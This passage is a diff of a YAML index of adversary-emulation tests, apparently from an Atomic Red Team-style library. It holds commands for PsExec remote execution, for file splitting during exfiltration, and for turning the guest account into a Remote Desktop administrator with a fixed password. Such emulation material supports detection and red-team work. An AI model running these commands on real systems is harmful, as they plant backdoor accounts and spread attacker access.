+
+'
   T1053:
     technique:
       created: '2017-05-31T21:30:46.977Z'
@@ -57427,10 +58044,26 @@ lateral-movement:
           description: Remote computer to receive the copy and execute the file
           type: String
           default: "\\\\localhost"
-      executor:
-        command: 'psexec.exe #{remote_host} -accepteula -c #{command_path}
+        psexec_exe:
+          description: Path to PsExec
+          type: string
+          default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'PsExec tool from Sysinternals must exist on disk at specified
+          location (#{psexec_exe})
 
 '
+        prereq_command: 'if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
+      executor:
+        command: "#{psexec_exe} #{remote_host} -accepteula -c #{command_path}\n"
         name: command_prompt
         elevation_required: true
     - name: Execute command writing output to local Admin Share
@@ -61156,9 +61789,11 @@ exfiltration:
           exit 0; fi;
 
 '
-        get_prereq_command: "if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path};
-          touch #{folder_path}/safe_to_delete; fi;      \ndd if=/dev/urandom of=#{folder_path}/#{file_name}
-          bs=25000000 count=1\n"
+        get_prereq_command: 'if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path};
+          touch #{folder_path}/safe_to_delete; fi; dd if=/dev/urandom of=#{folder_path}/#{file_name}
+          bs=25000000 count=1
+
+'
       executor:
         command: |
           cd #{folder_path}; split -b 5000000 #{file_name}
@@ -62283,18 +62918,27 @@ initial-access:
         allow multiple RDP connections
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
+        guest_password:
+          description: Specigy the guest password
+          type: String
+          default: Password123!
       executor:
         command: |-
-          net user guest /active:yes
-          net user guest Password123!
-          net localgroup administrators guest /add
-          net localgroup "Remote Desktop Users" guest /add
+          net user #{guest_user} /active:yes
+          net user #{guest_user} #{guest_password}
+          net localgroup administrators #{guest_user} /add
+          net localgroup "Remote Desktop Users" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no >nul 2>&1
-          net localgroup administrators guest /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          net user #{guest_user} /active:no >nul 2>&1
+          net localgroup administrators #{guest_user} /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
